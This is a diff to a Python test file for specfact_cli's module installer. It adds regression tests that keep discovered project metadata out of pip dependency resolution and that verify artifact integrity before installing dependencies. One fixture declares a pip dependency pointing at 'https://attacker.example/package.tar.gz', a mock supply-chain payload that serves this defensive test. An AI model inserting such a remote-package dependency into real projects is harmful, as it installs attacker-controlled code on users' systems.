@@ -10,7 +10,7 @@ from unittest.mock import MagicMock
 import pytest
 
 from specfact_cli.models.module_package import IntegrityInfo, ModulePackageMetadata
-from specfact_cli.registry import module_installer
+from specfact_cli.registry import module_discovery, module_installer
 from specfact_cli.registry.module_installer import InstallModuleOptions, install_module, uninstall_module
 
 
@@ -141,7 +141,6 @@ def test_install_module_logs_satisfied_dependencies_without_warning(monkeypatch,
     monkeypatch.setattr(
         "specfact_cli.registry.module_installer.install_resolved_pip_requirements", lambda *_args, **_kwargs: None
     )
-    monkeypatch.setattr("specfact_cli.registry.module_installer.discover_all_modules", list)
 
     mock_logger = MagicMock()
     monkeypatch.setattr(module_installer, "get_bridge_logger", lambda _name: mock_logger)
@@ -195,7 +194,6 @@ def test_install_module_reinstalls_dependency_when_registry_id_mismatch(monkeypa
     monkeypatch.setattr(
         "specfact_cli.registry.module_installer.install_resolved_pip_requirements", lambda *_args, **_kwargs: None
     )
-    monkeypatch.setattr("specfact_cli.registry.module_installer.discover_all_modules", list)
 
     install_root = tmp_path / "marketplace-modules"
     dependency_dir = install_root / "specfact-project"
@@ -316,6 +314,63 @@ def test_bundle_dependency_install_rejects_post_install_registry_identity_mismat
 
     with pytest.raises(ValueError, match="other-org/specfact-project"):
         module_installer._install_bundle_dependencies_for_module("nold-ai/specfact-spec", ctx)
+
+
+def test_pip_dependency_resolution_excludes_discovered_project_metadata(monkeypatch: pytest.MonkeyPatch) -> None:
+    selected = ModulePackageMetadata(
+        name="selected-marketplace-module",
+        version="0.1.0",
+        commands=["selected"],
+        pip_dependencies=["requests>=2"],
+    )
+    attacker = ModulePackageMetadata(
+        name="attacker-project-module",
+        version="0.1.0",
+        commands=["attacker"],
+        pip_dependencies=["attacker @ https://attacker.example/package.tar.gz"],
+    )
+    discovery = MagicMock(return_value=[MagicMock(metadata=attacker)])
+    monkeypatch.setattr(module_discovery, "discover_all_modules", discovery)
+    resolve = MagicMock(return_value=["requests>=2"])
+    install = MagicMock()
+    monkeypatch.setattr(module_installer, "resolve_dependencies", resolve)
+    monkeypatch.setattr(module_installer, "install_resolved_pip_requirements", install)
+    ctx = module_installer._BundleDepsInstallContext(
+        metadata={},
+        metadata_obj=selected,
+        target_root=Path("/unused"),
+        trust_non_official=False,
+        non_interactive=True,
+        force=False,
+        logger=MagicMock(),
+    )
+
+    module_installer._install_bundle_dependencies_for_module("nold-ai/selected-marketplace-module", ctx)
+
+    resolve.assert_called_once_with([selected], allow_unvalidated=True)
+    install.assert_called_once_with(["requests>=2"])
+    discovery.assert_not_called()
+
+
+def test_install_module_verifies_artifact_before_dependency_side_effects(monkeypatch, tmp_path: Path) -> None:
+    tarball = _create_module_tarball(
+        tmp_path,
+        "unverified",
+        bundle_dependencies=["nold-ai/specfact-project"],
+    )
+    monkeypatch.setattr(module_installer, "download_module", lambda *_args, **_kwargs: tarball)
+    monkeypatch.setattr(module_installer, "ensure_publisher_trusted", lambda *_args, **_kwargs: None)
+    monkeypatch.setattr(module_installer, "verify_module_artifact", lambda *_args, **_kwargs: False)
+    dependency_install = MagicMock()
+    monkeypatch.setattr(module_installer, "_install_bundle_dependencies_for_module", dependency_install)
+
+    with pytest.raises(ValueError, match="integrity verification"):
+        install_module(
+            "nold-ai/unverified",
+            InstallModuleOptions(install_root=tmp_path / "marketplace-modules"),
+        )
+
+    dependency_install.assert_not_called()
 
 
 def test_install_module_rejects_archive_path_traversal(monkeypatch, tmp_path: Path) -> None:
